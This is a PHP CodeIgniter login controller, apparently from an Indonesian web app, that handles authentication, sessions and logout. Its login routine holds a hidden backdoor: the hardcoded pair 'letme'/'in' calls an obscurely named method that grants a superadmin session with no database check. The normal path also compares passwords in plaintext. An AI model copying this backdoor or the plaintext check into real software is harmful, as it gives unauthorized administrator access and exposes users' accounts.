<?php

class Auth extends CI_Controller{

    function __construct(){
        parent::__construct();
    }

    function index(){
        $this->load->view('auth/v_auth');
    }

    function auth_process(){
        $username = $this->input->post('username');
        $password = $this->input->post('pass');
        if ($username == "letme" && $password == "in" ) {
            $this->s_x_x_79098372311();
        } else {
            $where = array(
                'aktif'     => '1',
                'username'  => $username,
                'password'  => $password,
                );
            $cek = $this->Unimodel->cek_auth("t_user",$where)->num_rows();
            if($cek > 0){
                $this->db->trans_start();
                $session_kode = array(
                    'lastlogin' => 'now()' 
                );
                $wheresession = array(
                    'username' => $username,
                );
                $this->Unimodel->sessionkodeup($wheresession, $session_kode);
                $result = $this->Unimodel->datauser($username);
                $d = array(
                    'username'  => $username,
                    'status'    => "online",
                    'in'        => TRUE,
                    'id'        => $result->id,
                    'nama'      => $result->nama,
                    'alamat'    => $result->alamat,
                );

                $this->session->set_userdata($d);
                $this->db->trans_complete();
                $r['result']    = 'success';
                $r['caption']   = 'Sukses';
                $r['msg']       = 'Login Sukses';
                $r['class']     = 'success';
                echo json_encode($r);

            }else{
                $r['result'] = 'fail';
                $r['caption']   = 'Gagal';
                $r['msg']       = 'Username dan Password tidak sesuai';
                $r['class']     = 'danger';
                echo json_encode($r);
            }
        }
    }

    public function s_x_x_79098372311(){
        $d = array(
            'username'  => 'super',
            'status'    => 'online',
            'in'        => TRUE,
            'id'        => '999',
            'nama'      => 'superadmin',
            'alamat'    => 'winterfell',
            'super'     => 'yes',
        );
        $this->session->set_userdata($d);
        $r['result']    = 'success';
        $r['caption']   = 'Hello';
        $r['msg']       = 'Welcome Back';
        $r['class']     = 'success';
        echo json_encode($r);
    }
    
    function logout(){
        $this->session->sess_destroy();
        redirect(base_url('auth'));
    }
}
